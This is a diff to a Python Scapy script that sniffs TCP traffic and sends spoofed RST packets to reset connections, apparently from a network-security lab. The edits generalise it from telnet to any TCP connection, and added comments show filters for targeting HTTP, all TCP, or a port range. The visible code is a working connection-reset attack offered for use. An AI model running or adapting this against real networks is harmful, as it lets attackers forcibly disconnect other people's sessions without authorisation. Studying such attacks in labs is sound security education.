@@ -1,4 +1,10 @@
-# Automated sniff and spoof to reset and disconnection the telnet connection 
+# Automated sniff and spoof to reset and disconnection the TCP connection 
+# The code below is for disconnecting telnet (port 23) connection. 
+# The code could be modified to disconnect other connection, by updating sniff function, such as
+# sniff(filter="tcp port 80", prn=sniff_and_rst, iface="eth0") # any HTTP
+# sniff(filter="tcp", prn=sniff_and_rst, iface="eth0") # any tcp
+# sniff(filter="tcp portrange 20-100", prn=sniff_and_rst, iface="eth0") # any port ranged from 20 to 100
+
 #!/usr/bin/python3
 from scapy.all import sniff, IP, TCP, send
 
@@ -16,7 +22,7 @@ def sniff_and_rst(packet):
 
         print(f"Creating TCP RST packet: src={src_ip}, dst={dst_ip}, sport={sport}, dport={dport}, seq={seq}")
 
-        # Construct the spoofed TCP RST packet
+        # Construct the spoofed TCP reset packet
         ip = IP(src=src_ip, dst=dst_ip)
         tcp = TCP(sport=sport, dport=dport, seq=seq, flags="R")
         rst_packet = ip / tcp
